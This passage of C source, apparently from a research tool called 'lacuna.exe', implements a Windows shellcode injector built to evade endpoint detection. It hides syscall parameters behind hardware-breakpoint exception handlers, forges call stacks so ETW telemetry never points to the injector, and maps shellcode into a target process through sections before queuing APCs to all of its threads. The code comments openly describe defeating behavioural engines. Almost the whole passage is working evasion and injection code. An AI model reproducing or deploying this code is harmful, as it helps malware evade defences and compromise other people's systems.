        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    /* DR1: after syscall returned through the spoofed ret gadget in ntdll.
       Restore all spoofed stack slots, then redirect to real epilogue. */
    if (ctx->Dr6 & 0x2) {
        if (g_n_spoofed) {
            ULONG64 *base = (ULONG64 *)g_spoof_rsp;
            for (int i = 0; i < g_n_spoofed; i++)
                base[g_saved_idx[i]] = g_saved_slots[i];
            g_n_spoofed = 0;
        }
        ctx->Rip = g_real_ret;
        ctx->Dr1 = 0;
        ctx->Dr7 &= ~0x4ULL;
        ctx->Dr6 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* DR0: at syscall;ret — decrypt params + spoof entire call stack */
    if (!(ctx->Dr6 & 0x1) || !g_pcrypt.armed)
        return EXCEPTION_CONTINUE_SEARCH;

    if (g_pcrypt.key) {
        ctx->Rcx ^= g_pcrypt.key;
        ctx->R10 ^= g_pcrypt.key;
        ctx->Rdx ^= g_pcrypt.key;
        ctx->R8  ^= g_pcrypt.key;
        ctx->R9  ^= g_pcrypt.key;
    }

    if (g_ret_gadget) {
        ULONG64 *rsp = (ULONG64 *)ctx->Rsp;
        g_real_ret = *rsp;
        *rsp = g_ret_gadget;
        g_spoof_rsp = ctx->Rsp;

        /* full_spoof: scan stack and replace any value within lacuna.exe's
           image with ghost frame addresses.  This removes ALL unsigned-module
           frames from the ETW-Ti stack capture so call_stack_final_user_module
           is never the injector binary. */
        g_n_spoofed = 0;
        if (g_pcrypt.full_spoof && g_exe_base && g_ls) {
            ULONG64 gh[4] = {
                g_ls->L1_wow64, g_ls->L2_kbase,
                g_ls->L3_ntdll, g_ls->L4_win32u
            };
            for (int i = 1; i <= MAX_SPOOF; i++) {
                ULONG64 v = rsp[i];
                if (v >= g_exe_base && v < g_exe_end) {
                    g_saved_slots[g_n_spoofed] = v;
                    g_saved_idx[g_n_spoofed]   = i;
                    rsp[i] = gh[g_n_spoofed % 4];
                    g_n_spoofed++;
                    if (g_n_spoofed >= MAX_SPOOF) break;
                }
            }
        }

        ctx->Dr1 = g_ret_gadget;
        ctx->Dr7 = (ctx->Dr7 | 0x4) & ~(0xFULL << 20);
    }

    ctx->Dr0 = 0;
    ctx->Dr7 &= ~0x1ULL;
    ctx->Dr6 = 0;
    g_pcrypt.armed = false;

    return EXCEPTION_CONTINUE_EXECUTION;
}

static void pcrypt_arm(ULONG64 key, ULONG64 syscall_ret_addr, bool full)
{
    if (!syscall_ret_addr) return;
    g_pcrypt.key        = key;
    g_pcrypt.armed      = true;
    g_pcrypt.full_spoof = full;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext((HANDLE)-2, &ctx);
    ctx.Dr0 = syscall_ret_addr;
    ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    SetThreadContext((HANDLE)-2, &ctx);
}

static void pcrypt_disarm(void)
{
    g_pcrypt.armed = false;
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext((HANDLE)-2, &ctx);
    ctx.Dr0 = 0;
    ctx.Dr1 = 0;
    ctx.Dr7 &= ~0x5ULL;
    ctx.Dr6 = 0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    SetThreadContext((HANDLE)-2, &ctx);
}


/*
 * Section-based APC injection.
 *
 * Standard VirtualAlloc+WriteProcessMemory+VirtualProtect leaves three
 * correlated syscalls (AllocVM / WriteVM / ProtectVM) that behavioral engines
 * stitch together with NtQueueApcThread to flag injection.  Replacing the
 * whole thing with NtCreateSection + two NtMapViewOfSection calls removes that
 * triad entirely: we write shellcode to a local RW mapping of the section,
 * then hand a separate RX mapping to the target — NtWriteVirtualMemory is
 * never called across the process boundary at all.
 *
 * Sequence that actually hits the kernel:
 *   NtOpenProcess → NtCreateSection → NtMapViewOfSection(self,RW)
 *   [local memcpy] → NtMapViewOfSection(target,RX)
 *   NtUnmapViewOfSection(self) → NtClose(section)
 *   NtOpenThread → NtQueueApcThread → NtAlertThread → NtDelayExecution
 */
static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (!g_exe_base) {
        HMODULE self = GetModuleHandleA(NULL);
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)self;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((uint8_t *)self + dos->e_lfanew);
        g_exe_base = (ULONG64)self;
        g_exe_end  = g_exe_base + nt->OptionalHeader.SizeOfImage;
        printf("[*] exe range for stack spoof: %llx-%llx\n", g_exe_base, g_exe_end);
    }

    static const char *api_names[] = {
        "NtOpenProcess", "NtCreateSection", "NtMapViewOfSection",
        "NtUnmapViewOfSection", "NtOpenThread", "NtQueueApcThread",
        "NtAlertThread", "NtClose"
    };
    static DWORD ssns[8];
    static ULONG64 srs[8];
    for (int i = 0; i < 8; i++) {
        ssns[i] = resolve_ssn(ntdll, api_names[i]);
        srs[i]  = find_func_syscall(ntdll, api_names[i]);
        printf("[*] %-24s  ssn=%02lx  syscall;ret=ntdll+%llx\n",
               api_names[i], ssns[i], srs[i] ? srs[i] - (ULONG64)ntdll : 0);
    }

    /* all locals that must survive stomp_plant are static — stomp_plant
       writes chain layers into frame[1..4] (RBP+8..+32) which with -O2
       can overlap compiler-placed locals on the stack */
    static PNtOpenProcess        open_proc;
    static PNtCreateSection      mk_sec;
    static PNtMapViewOfSection   map_view;
    static PNtUnmapViewOfSection unmap_view;
    static PNtOpenThread         open_thr;
    static PNtQueueApcThread     queue_apc;
    static PNtAlertThread        alert_thr;
    static PNtClose              nt_close;
    static PNtProtectVirtualMemory prot_vm;
    static HANDLE hProc, hSec;
    static PVOID  local_base, remote_base;
    static SIZE_T *p_local_sz = NULL, *p_remote_sz = NULL;
    static PVOID  pcrypt_veh, veh;
    static NTSTATUS s;

    if (!p_local_sz) {
        p_local_sz  = (SIZE_T *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SIZE_T));
        p_remote_sz = (SIZE_T *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SIZE_T));
    }

    open_proc  = alloc_stub(ssns[0], srs[0]);
    mk_sec     = alloc_stub(ssns[1], srs[1]);
    map_view   = alloc_stub(ssns[2], srs[2]);
    unmap_view = alloc_stub(ssns[3], srs[3]);
    open_thr   = alloc_stub(ssns[4], srs[4]);
    queue_apc  = alloc_stub(ssns[5], srs[5]);
    alert_thr  = alloc_stub(ssns[6], srs[6]);
    nt_close   = alloc_stub(ssns[7], srs[7]);

    DWORD   ssn_prot = resolve_ssn(ntdll, "NtProtectVirtualMemory");
    ULONG64  sr_prot = find_func_syscall(ntdll, "NtProtectVirtualMemory");
    printf("[*] %-24s  ssn=%02lx  syscall;ret=ntdll+%llx\n",
           "NtProtectVirtualMemory", ssn_prot,
           sr_prot ? sr_prot - (ULONG64)ntdll : 0ULL);
    prot_vm = alloc_stub(ssn_prot, sr_prot);

    if (!open_proc || !mk_sec || !map_view || !unmap_view
            || !open_thr || !queue_apc || !alert_thr || !nt_close || !prot_vm) {
        fprintf(stderr, "[-] stub alloc failed\n"); return false;
    }

    /* ret gadget for return-address spoofing: use NtClose's ret (C3) in ntdll.
       srs[7] points to NtClose's 0F 05 C3 sequence, so +2 is a bare ret. */
    g_ret_gadget = srs[7] ? srs[7] + 2 : 0;
    if (g_ret_gadget)
        printf("[*] ret gadget for stack spoof: ntdll+%llx\n",
               g_ret_gadget - (ULONG64)ntdll);

    pcrypt_veh = AddVectoredExceptionHandler(1, param_encrypt_veh);

#define PKEY 0xCAFE1337ULL
#define EP(p) ((void*)((ULONG64)(p) ^ PKEY))

    hProc = NULL; hSec = NULL;
    local_base = NULL; *p_local_sz = 0;
    remote_base = NULL; *p_remote_sz = 0;
    OBJECT_ATTRIBUTES oa  = { sizeof(OBJECT_ATTRIBUTES) };
    CID cid = { (HANDLE)(ULONG_PTR)pid, NULL };

    pcrypt_arm(PKEY, srs[0], true);
    s = open_proc(
        (PHANDLE)EP(&hProc),
        (ACCESS_MASK)((PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) ^ (DWORD)PKEY),
        (POBJECT_ATTRIBUTES)EP(&oa),
        (CID *)EP(&cid));
    if (!NT_OK(s)) { fprintf(stderr, "[-] NtOpenProcess: %08lx\n", s); goto done; }
    printf("[+] proc  %p  pid %lu\n", hProc, pid); fflush(stdout);

    veh = AddVectoredExceptionHandler(1, chain_veh);

    printf("[*] calling stomp_plant...\n"); fflush(stdout);
    stomp_plant();
    printf("[*] stomp_plant done\n"); fflush(stdout);

    /* create section — parameter encryption hides SECTION_ALL_ACCESS
       from any remaining userland hook intercepts */
    hSec = NULL;
    LARGE_INTEGER sec_sz = { .QuadPart = (LONGLONG)sc_sz };

    printf("[*] arming pcrypt for NtCreateSection (srs[1]=%llx)...\n", srs[1]); fflush(stdout);
    pcrypt_arm(PKEY, srs[1], true);
    printf("[*] calling mk_sec...\n"); fflush(stdout);
    s = mk_sec(
        (PHANDLE)EP(&hSec),
        (ACCESS_MASK)(SECTION_ALL_ACCESS ^ (DWORD)PKEY),
        (POBJECT_ATTRIBUTES)EP(NULL),
        (PLARGE_INTEGER)EP(&sec_sz),
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_OK(s)) { fprintf(stderr, "[-] NtCreateSection: %08lx\n", s); goto done; }
    printf("[+] section  %p\n", hSec); fflush(stdout);

    local_base = NULL; *p_local_sz = sc_sz;
    pcrypt_arm(0, srs[2], true);
    s = map_view(hSec, (HANDLE)-1, &local_base, 0, sc_sz, NULL, p_local_sz,
                 ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(local): %08lx\n", s); goto done; }
    printf("[+] local rw  %p\n", local_base); fflush(stdout);

    for (SIZE_T i = 0; i < sc_sz; i++) ((uint8_t *)local_base)[i] = sc[i] ^ 0x5A;
    for (SIZE_T i = 0; i < sc_sz; i++) ((uint8_t *)local_base)[i] ^= 0x5A;
    printf("[+] shellcode written (%zu bytes)\n", sc_sz); fflush(stdout);

    remote_base = NULL; *p_remote_sz = sc_sz;
    pcrypt_arm(PKEY, srs[2], true);
    s = map_view(
        (HANDLE)((ULONG64)hSec ^ PKEY),
        (HANDLE)((ULONG64)hProc ^ PKEY),
        (PVOID *)EP(&remote_base),
        (ULONG_PTR)(0 ^ PKEY),
        sc_sz, NULL, p_remote_sz,
        ViewUnmap, 0, PAGE_EXECUTE_READ);
    if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(remote): %08lx\n", s); goto done; }
    printf("[+] remote rx  %p\n", remote_base); fflush(stdout);

    printf("[*] unmapping local view (base=%p)...\n", local_base); fflush(stdout);
    pcrypt_arm(0, srs[3], true);
    s = unmap_view((HANDLE)-1, local_base);
    printf("[*] unmap returned %08lx\n", s); fflush(stdout);
    printf("[*] closing section...\n"); fflush(stdout);
    nt_close(hSec); hSec = NULL;

    /* queue APC to every thread in the target */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] snapshot failed (%lu)\n", GetLastError());
        s = (NTSTATUS)0xC0000001L; goto done;
    }
    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            CID tcid = { (HANDLE)(ULONG_PTR)pid, (HANDLE)(ULONG_PTR)te.th32ThreadID };
            OBJECT_ATTRIBUTES toa = { sizeof(OBJECT_ATTRIBUTES) };
            HANDLE ht = NULL;
            pcrypt_arm(0, srs[4], true);
            NTSTATUS ts = open_thr(&ht, THREAD_SET_CONTEXT|THREAD_ALERT, &toa, &tcid);
            if (!NT_OK(ts)) continue;
            pcrypt_arm(0, srs[5], true);
            ts = queue_apc(ht, remote_base, remote_base, NULL, NULL);
            if (NT_OK(ts)) {
                printf("[+] apc  tid %lu\n", te.th32ThreadID); fflush(stdout);
                pcrypt_arm(0, srs[6], true);
                alert_thr(ht);
                queued++;
            }
            nt_close(ht);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (queued == 0) {
        fprintf(stderr, "[-] no threads took the APC\n");
        s = (NTSTATUS)0xC0000022L; goto done;
    }
    printf("[+] queued to %d thread(s)\n", queued);

    /* drain our own ETW-Ti APCs while the chain is still live on-stack */
    LARGE_INTEGER drain = { .QuadPart = -100000LL };
    _NtDelay(TRUE, &drain);
    stomp_restore();
    s = 0;

done:
    stomp_restore();
    pcrypt_disarm();
    RemoveVectoredExceptionHandler(veh);
    RemoveVectoredExceptionHandler(pcrypt_veh);
    if (hSec)  nt_close(hSec);
    if (hProc) nt_close(hProc);
    VirtualFree(open_proc,  0, MEM_RELEASE);
    VirtualFree(mk_sec,     0, MEM_RELEASE);
    VirtualFree(map_view,   0, MEM_RELEASE);
    VirtualFree(unmap_view, 0, MEM_RELEASE);
    VirtualFree(open_thr,   0, MEM_RELEASE);
    VirtualFree(queue_apc,  0, MEM_RELEASE);
    VirtualFree(alert_thr,  0, MEM_RELEASE);
    VirtualFree(nt_close,   0, MEM_RELEASE);
    VirtualFree(prot_vm,    0, MEM_RELEASE);
    return NT_OK(s);
}


static void do_scan(void)
{
    struct { const char *mod; const char **t; int n; } dlls[] = {
        {"ntdll.dll",      (const char*[]){"NtAllocateVirtualMemory","NtCreateThreadEx",
                            "RtlCreateUserThread","LdrLoadDll","RtlUserThreadStart"}, 5},
        {"kernelbase.dll", (const char*[]){"VirtualProtect","VirtualAllocEx",
                            "WriteProcessMemory","CreateRemoteThreadEx"}, 4},
        {"wow64.dll",      (const char*[]){"Wow64PrepareForException",
                            "Wow64KiUserCallbackDispatcher","Wow64ApcRoutine"}, 3},
        {"win32u.dll",     (const char*[]){"NtGdiDdDDICreateDevice","NtUserCallNoParam"}, 2},
    };
    for (int i = 0; i < 4; i++) {
        HMODULE m = GetModuleHandleA(dlls[i].mod);
        if (!m) { printf("\n  %s  not loaded\n", dlls[i].mod); continue; }
        Ghost buf[512];
        int n = scan_ghosts(m, dlls[i].t, dlls[i].n, buf, 512);
        printf("\n%s  —  %d ghost regions\n", dlls[i].mod, n);
        for (int j = 0; j < n && j < 25; j++)
            printf("  %llx–%llx  %4uB  %-30s  dist=%u\n",
                   buf[j].va_start, buf[j].va_end, buf[j].size,
                   buf[j].name[0] ? buf[j].name : "—", buf[j].dist);
        if (n > 25) printf("  ... %d more\n", n - 25);

        GhostGadget gg[32];
        int ngg = scan_ghost_gadgets(buf, n, dlls[i].mod, gg, 32);
        if (ngg)
            printf("  ghost gadgets (jmp [rbx]):\n");
        for (int j = 0; j < ngg; j++)
            printf("    %llx  %s\n", gg[j].va, gg[j].parent);

        if (!strcmp(dlls[i].mod, "win32u.dll"))
            printf("  first nop gap: %llx\n", win32u_nop_gap(m));
    }
}


int main(int argc, char **argv)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("Lacuna-Chain Ghost Frames: Forging Plausible Call Stacks from .pdata Lacunae\n");
    printf("Mohamed Alzhrani (0xmaz), 2026\n\n");

    if (argc < 2) {
        printf("usage:\n");
        printf("  lacuna.exe scan\n");
        printf("  lacuna.exe verify\n");
        printf("  lacuna.exe inject <pid> <sc.bin>\n");
        return 1;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtDelay = (PNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");

    if (!strcmp(argv[1], "scan")) {
        do_scan();
        return 0;
    }

    if (!build_chain()) return 1;

    if (!strcmp(argv[1], "verify")) {
        lacuna_walk_chain();
        goto out;
    }

    if (!strcmp(argv[1], "inject")) {
        if (argc < 4) {
            fprintf(stderr, "usage: lacuna.exe inject <pid> <sc.bin>\n");
            return 1;
        }
        DWORD pid = (DWORD)atoi(argv[2]);
        if (!pid) { fprintf(stderr, "[-] bad pid\n"); return 1; }

        FILE *f = fopen(argv[3], "rb");
        if (!f) { fprintf(stderr, "[-] can't open %s\n", argv[3]); return 1; }
        fseek(f, 0, SEEK_END); long sc_sz = ftell(f); rewind(f);
        uint8_t *sc = malloc(sc_sz);
        fread(sc, 1, sc_sz, f); fclose(f);

        printf("[*] %ld bytes  ->  pid %lu\n\n", sc_sz, pid);
        bool ok = do_inject_sapc(pid, sc, (SIZE_T)sc_sz);
        free(sc);
        printf("\n%s injection %s\n", ok ? "[+]" : "[-]", ok ? "done" : "failed");
        goto out;
    }

    fprintf(stderr, "unknown command '%s'\n", argv[1]);

out:
    if (g_ls) VirtualFree(g_ls, 0, MEM_RELEASE);
    return 0;
}
